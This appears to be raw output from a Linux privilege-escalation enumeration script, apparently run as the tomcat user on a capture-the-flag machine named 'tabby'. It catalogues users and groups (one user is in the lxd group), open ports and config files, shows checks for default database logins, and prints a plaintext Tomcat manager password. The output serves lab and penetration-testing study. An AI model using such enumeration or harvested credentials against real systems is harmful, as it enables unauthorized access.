org.freedesktop.timesync1       647 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service   -       -


════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS                                                                                
tabby                                                                                                               
127.0.0.1 localhost
127.0.1.1 tabby
127.0.0.1 megahosting.com

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0

╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found                                                                                           
                                                                                                                    
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                 
link-local 169.254.0.0
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.194  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:0d:d1  txqueuelen 1000  (Ethernet)
        RX packets 487976  bytes 76727672 (76.7 MB)
        RX errors 0  dropped 182  overruns 0  frame 0
        TX packets 481348  bytes 227651530 (227.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 46346  bytes 3292640 (3.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 46346  bytes 3292640 (3.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Networks and neighbours
Kernel IP routing table                                                                                             
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens192
Address                  HWtype  HWaddress           Flags Mask            Iface
_gateway                 ether   00:50:56:b9:d7:6c   C                     ens192

╔══════════╣ Iptables rules
iptables rules Not Found                                                                                            
                                                                                                                    
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                            
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      950/java                            
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                  
                                                                                                                    

════════════════════════════════════╣ Users Information ╠════════════════════════════════════
╔══════════╣ My user                                                                                                
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                 
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)                                                                  

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                        
netpgpkeys Not Found
netpgp Not Found                                                                                                    
                                                                                                                    
╔══════════╣ Clipboard or highlighted text?
xsel and xclip Not Found                                                                                            
                                                                                                                    
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
Sorry, try again.                                                                                                   

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                   
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                               
gdb wasn't found in PATH

╔══════════╣ Checking doas.conf
doas.conf Not Found                                                                                                 
                                                                                                                    
╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2               
                                                                                                                    
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                     

╔══════════╣ Users with console
ash:x:1000:1000:clive:/home/ash:/bin/bash                                                                           
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                              
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=112(mysql) gid=120(mysql) groups=120(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 04:03:58 up  4:49,  0 users,  load average: 0.39, 0.10, 0.03                                                       
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     tty1         Tue May 19 23:18:26 2020 - down                      (00:02)     0.0.0.0                      
reboot   system boot  Tue May 19 23:16:06 2020 - Tue May 19 23:20:59 2020  (00:04)     0.0.0.0
root     tty1         Tue May 19 23:15:16 2020 - down                      (00:00)     0.0.0.0
reboot   system boot  Tue May 19 23:12:37 2020 - Tue May 19 23:16:00 2020  (00:03)     0.0.0.0
root     tty1         Tue May 19 22:23:13 2020 - down                      (00:49)     0.0.0.0
reboot   system boot  Tue May 19 11:55:31 2020 - Tue May 19 23:12:31 2020  (11:17)     0.0.0.0
clive    tty1         Tue May 19 11:48:00 2020 - down                      (00:07)     0.0.0.0
reboot   system boot  Tue May 19 10:39:15 2020 - Tue May 19 11:55:24 2020  (01:16)     0.0.0.0

wtmp begins Tue May 19 10:39:15 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                   
root             pts/0    10.10.14.2       Wed Jun 17 21:58:30 +0000 2020
ash              tty1                      Tue May 19 11:48:00 +0000 2020
root             pts/0    10.10.14.2       Wed Jun 17 21:58:30 +0000 2020

╔══════════╣ Password policy
PASS_MAX_DAYS   99999                                                                                               
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                              
                                                                                                                    
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                    


════════════════════════════════════╣ Software Information ╠════════════════════════════════════
╔══════════╣ MySQL version                                                                                          
mysql  Ver 8.0.20-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))                                                   

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                          
═╣ MySQL connection using root/NOPASS ................. No                                                          
╔══════════╣ Searching mysql credentials and exec                                                                   
                                                                                                                    
╔══════════╣ Analyzing PostgreSQL Files (limit 70)
Version: psql Not Found                                                                                             
                                                                                                                    
pgadmin*.db Not Found
                                                                                                                    
pg_hba.conf Not Found
                                                                                                                    
postgresql.conf Not Found
                                                                                                                    
pgsql.conf Not Found
                                                                                                                    
═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No                                             
═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                             
═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                             
                                                                                                                    
╔══════════╣ Analyzing Mongo Files (limit 70)
Version: mongo Not Found                                                                                            
mongod Not Found                                                                                                    
                                                                                                                    
mongod*.conf Not Found
                                                                                                                    
╔══════════╣ Analyzing Apache Files (limit 70)
Version: Server version: Apache/2.4.41 (Ubuntu)                                                                     
Server built:   2020-04-13T17:19:17
httpd Not Found
                                                                                                                    
══╣ PHP exec extensions
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">                                            
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
drwxr-xr-x 2 root root 4096 May 21  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 May 21  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 May 21  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                                               
        # The ServerName directive sets the request scheme, hostname and port that
        # redirection URLs. In the context of virtual hosts, the ServerName
        #ServerName www.example.com


-rw-r--r-- 1 root root 1332 Apr 13  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
lrwxrwxrwx 1 root root 35 May 21  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                                               
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

╔══════════╣ Analyzing Tomcat Files (limit 70)
-rw-r----- 1 root tomcat 2325 Jun 16  2020 /etc/tomcat9/tomcat-users.xml                                            
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
-rw-r--r-- 1 root root 2325 Jun 16  2020 /usr/share/tomcat9/etc/tomcat-users.xml
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

╔══════════╣ Analyzing FastCGI Files (limit 70)
fastcgi_params Not Found                                                                                            
                                                                                                                    
╔══════════╣ Analyzing Http conf Files (limit 70)
httpd.conf Not Found                                                                                                
                                                                                                                    
╔══════════╣ Analyzing Htpasswd Files (limit 70)
.htpasswd Not Found                                                                                                 
                                                                                                                    
╔══════════╣ Analyzing PHP Sessions Files (limit 70)
/var/lib/php/sessions Not Found                                                                                     
sess_* Not Found                                                                                                    
                                                                                                                    
╔══════════╣ Analyzing Wordpress Files (limit 70)
wp-config.php Not Found                                                                                             
                                                                                                                    
╔══════════╣ Analyzing Drupal Files (limit 70)
settings.php Not Found                                                                                              
                                                                                                                    
╔══════════╣ Analyzing Moodle Files (limit 70)
config.php Not Found                                                                                                
                                                                                                                    
╔══════════╣ Analyzing Supervisord Files (limit 70)
supervisord.conf Not Found                                                                                          
                                                                                                                    
╔══════════╣ Analyzing Cesi Files (limit 70)
cesi.conf Not Found                                                                                                 
                                                                                                                    
╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Oct 15  2019 /usr/share/doc/rsync/examples/rsyncd.conf                                  
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

rsyncd.secrets Not Found
                                                                                                                    
╔══════════╣ Analyzing Hostapd Files (limit 70)
hostapd.conf Not Found                                                                                              
                                                                                                                    
╔══════════╣ Searching wifi conns file
 Not Found                                                                                                          
                                                                                                                    
╔══════════╣ Analyzing Anaconda ks Files (limit 70)
anaconda-ks.cfg Not Found                                                                                           
                                                                                                                    
╔══════════╣ Analyzing VNC Files (limit 70)
.vnc Not Found                                                                                                      
                                                                                                                    
*vnc*.c*nf* Not Found
                                                                                                                    
*vnc*.ini Not Found
                                                                                                                    
*vnc*.txt Not Found
                                                                                                                    
*vnc*.xml Not Found
                                                                                                                    
╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                
drwxr-xr-x 2 root root 4096 May 19  2020 /etc/ldap

drwxr-xr-x 2 root root 32 Mar 11  2020 /snap/core18/1705/etc/ldap


╔══════════╣ Analyzing OpenVPN Files (limit 70)
*.ovpn Not Found                                                                                                    
                                                                                                                    
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                         
id_dsa* Not Found                                                                                                   
                                                                                                                    
id_rsa* Not Found
                                                                                                                    
known_hosts Not Found
                                                                                                                    
authorized_hosts Not Found
                                                                                                                    
authorized_keys Not Found
                                                                                                                    
PermitRootLogin yes
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication no
══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                          
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core18/1705/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core18/1705/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core18/1705/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core18/1705/etc/ssl/certs/AddTrust_External_Root.pem
/snap/core18/1705/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core18/1705/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core18/1705/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core18/1705/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core18/1705/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core18/1705/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core18/1705/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core18/1705/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core18/1705/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core18/1705/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core18/1705/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core18/1705/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core18/1705/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
9324PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                      
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                    


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                  
                                                                                                                    
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                
/etc/exports Not Found                                                                                              
                                                                                                                    
╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                 
tickets kerberos Not Found                                                                                          
klist Not Found                                                                                                     
                                                                                                                    
╔══════════╣ Analyzing Knockd Files (limit 70)
*knockd* Not Found                                                                                                  
                                                                                                                    
╔══════════╣ Analyzing Kibana Files (limit 70)
kibana.y*ml Not Found                                                                                               
                                                                                                                    
╔══════════╣ Analyzing Elasticsearch Files (limit 70)
The version is                                                                                                      
elasticsearch.y*ml Not Found
                                                                                                                    
╔══════════╣ Searching logstash files
 Not Found                                                                                                          
                                                                                                                    
╔══════════╣ Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                      
                                                                                                                    
╔══════════╣ Searching AD cached hashes
cached hashes Not Found                                                                                             
                                                                                                                    
╔══════════╣ Searching screen sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                   
Cannot make directory '/run/screen/S-tomcat': Read-only file system                                                 
╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                   
tmux Not Found                                                                                                      
                                                                                                                    
╔══════════╣ Analyzing CouchDB Files (limit 70)
couchdb Not Found                                                                                                   
                                                                                                                    
╔══════════╣ Analyzing Redis Files (limit 70)
redis.conf Not Found                                                                                                
                                                                                                                    
╔══════════╣ Searching dovecot files
dovecot credentials Not Found                                                                                       
                                                                                                                    
╔══════════╣ Analyzing Mosquitto Files (limit 70)
mosquitto.conf Not Found                                                                                            
                                                                                                                    
╔══════════╣ Analyzing Neo4j Files (limit 70)
neo4j Not Found                                                                                                     
                                                                                                                    
╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
credentials Not Found                                                                                               
                                                                                                                    
credentials.db Not Found
                                                                                                                    
legacy_credentials.db Not Found
                                                                                                                    
access_tokens.db Not Found
                                                                                                                    
access_tokens.json Not Found
                                                                                                                    
accessTokens.json Not Found
                                                                                                                    
azureProfile.json Not Found
                                                                                                                    
TokenCache.dat Not Found
                                                                                                                    
AzureRMContext.json Not Found
                                                                                                                    
.bluemix Not Found
                                                                                                                    
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3577 Apr 16  2020 /etc/cloud/cloud.cfg                                                       
     lock_passwd: True
-rw-r--r-- 1 root root 3517 Jan 15  2020 /snap/core18/1705/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing CloudFlare Files (limit 70)
.cloudflared Not Found                                                                                              
                                                                                                                    
╔══════════╣ Analyzing Erlang Files (limit 70)
.erlang.cookie Not Found                                                                                            
                                                                                                                    
╔══════════╣ Analyzing GMV Auth Files (limit 70)
gvm-tools.conf Not Found                                                                                            
                                                                                                                    
╔══════════╣ Analyzing IPSec Files (limit 70)
ipsec.secrets Not Found                                                                                             
                                                                                                                    
ipsec.conf Not Found
                                                                                                                    
╔══════════╣ Analyzing IRSSI Files (limit 70)
.irssi Not Found                                                                                                    
                                                                                                                    
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 200 Mar 11  2020 /snap/core18/1705/usr/share/keyrings                                        
drwxr-xr-x 2 root root 4096 Apr 23  2020 /usr/share/keyrings

*.keyring Not Found
                                                                                                                    
*.keystore Not Found
                                                                                                                    
*.jks Not Found
                                                                                                                    
╔══════════╣ Analyzing Filezilla Files (limit 70)
filezilla Not Found                                                                                                 
                                                                                                                    
filezilla.xml Not Found
                                                                                                                    
recentservers.xml Not Found
                                                                                                                    
╔══════════╣ Analyzing Backup Manager Files (limit 70)
storage.php Not Found                                                                                               
                                                                                                                    
database.php Not Found
                                                                                                                    
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                      
passwd file: /etc/passwd
passwd file: /snap/core18/1705/etc/pam.d/passwd
passwd file: /snap/core18/1705/etc/passwd
passwd file: /snap/core18/1705/usr/share/bash-completion/completions/passwd
passwd file: /snap/core18/1705/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/1705/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing kcpassword files
╚ TODO                                                                                                              
n                                                                                                                   

╔══════════╣ Searching GitLab related files
                                                                                                                    

╔══════════╣ Analyzing Github Files (limit 70)
.github Not Found                                                                                                   
                                                                                                                    
.gitconfig Not Found
                                                                                                                    
.git-credentials Not Found
                                                                                                                    
.git Not Found
                                                                                                                    
╔══════════╣ Analyzing Svn Files (limit 70)
.svn Not Found                                                                                                      
                                                                                                                    
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                        
gpg Not Found
netpgpkeys Not Found                                                                                                
netpgp Not Found                                                                                                    
*.pgp Not Found                                                                                                     
                                                                                                                    
-rw-r--r-- 1 root root 2796 Apr  9  2020 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Apr  9  2020 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Apr  9  2020 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core18/1705/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core18/1705/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core18/1705/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/1705/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core18/1705/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Mar 10  2020 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2236 Mar 30  2020 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Mar 30  2020 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg

*.gnupg Not Found
                                                                                                                    
╔══════════╣ Analyzing Cache Vi Files (limit 70)
*.swp Not Found                                                                                                     
                                                                                                                    
*.viminfo Not Found
                                                                                                                    
╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                   
                                                                                                                    
╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                             
                                                                                                                    
╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                
                                                                                                                    
╔══════════╣ Analyzing Firefox Files (limit 70)
.mozilla Not Found                                                                                                  
                                                                                                                    
Firefox Not Found
                                                                                                                    
╔══════════╣ Analyzing Chrome Files (limit 70)
google-chrome Not Found                                                                                             
                                                                                                                    
Chrome Not Found
                                                                                                                    
╔══════════╣ Analyzing Autologin Files (limit 70)
autologin Not Found                                                                                                 
                                                                                                                    
autologin.conf Not Found
                                                                                                                    
╔══════════╣ S/Key authentication
                                                                                                                    
╔══════════╣ YubiKey authentication
                                                                                                                    
╔══════════╣ Passwords inside pam.d
                                                                                                                    
╔══════════╣ Analyzing SNMP Files (limit 70)
snmpd.conf Not Found                                                                                                
                                                                                                                    
╔══════════╣ Analyzing Pypirc Files (limit 70)
.pypirc Not Found                                                                                                   
                                                                                                                    
╔══════════╣ Analyzing Ldaprc Files (limit 70)
.ldaprc Not Found                                                                                                   
                                                                                                                    
╔══════════╣ Analyzing Env Files (limit 70)
.env Not Found                                                                                                      
                                                                                                                    
╔══════════╣ Analyzing Msmtprc Files (limit 70)
.msmtprc Not Found                                                                                                  
                                                                                                                    
╔══════════╣ Analyzing Keepass Files (limit 70)
*.kdbx Not Found                                                                                                    
                                                                                                                    
KeePass.config* Not Found
                                                                                                                    
KeePass.ini Not Found
                                                                                                                    
KeePass.enforced* Not Found
                                                                                                                    
╔══════════╣ Analyzing FTP Files (limit 70)
*.ftpconfig Not Found                                                                                               
                                                                                                                    
ffftp.ini Not Found
                                                                                                                    
-rw-r--r-- 1 root root 69 May  5  2020 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May  5  2020 /usr/share/php7.4-common/common/ftp.ini

ftp.config Not Found
                                                                                                                    
sites.ini Not Found
                                                                                                                    
wcx_ftp.ini Not Found
                                                                                                                    
winscp.ini Not Found
                                                                                                                    
ws_ftp.ini Not Found
                                                                                                                    
╔══════════╣ Analyzing Racoon Files (limit 70)
racoon.conf Not Found                                                                                               
                                                                                                                    
psk.txt Not Found
                                                                                                                    
╔══════════╣ Analyzing Opera Files (limit 70)
com.operasoftware.Opera Not Found                                                                                   
                                                                                                                    
╔══════════╣ Analyzing Safari Files (limit 70)
Safari Not Found                                                                                                    
                                                                                                                    
╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /snap/core18/1705/usr/share/bash-completion/completions/bind                
-rw-r--r-- 1 root root 856 Apr  2  2018 /snap/core18/1705/usr/share/bash-completion/completions/bind


-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing SeedDMS Files (limit 70)
seeddms* Not Found                                                                                                  
                                                                                                                    
╔══════════╣ Analyzing Ddclient Files (limit 70)
ddclient.conf Not Found                                                                                             
                                                                                                                    
╔══════════╣ Analyzing Cacti Files (limit 70)
cacti Not Found                                                                                                     
                                                                                                                    
╔══════════╣ Analyzing Interesting logs Files (limit 70)
access.log Not Found                                                                                                
                                                                                                                    
error.log Not Found
                                                                                                                    
╔══════════╣ Analyzing Windows Files Files (limit 70)
unattend.inf Not Found                                                                                              
                                                                                                                    
*.rdg Not Found
                                                                                                                    
AppEvent.Evt Not Found
                                                                                                                    
ConsoleHost_history.txt Not Found
                                                                                                                    
FreeSSHDservice.ini Not Found
                                                                                                                    
NetSetup.log Not Found
                                                                                                                    
Ntds.dit Not Found
                                                                                                                    
protecteduserkey.bin Not Found
                                                                                                                    
RDCMan.settings Not Found
                                                                                                                    
SAM Not Found
                                                                                                                    
SYSTEM Not Found
                                                                                                                    
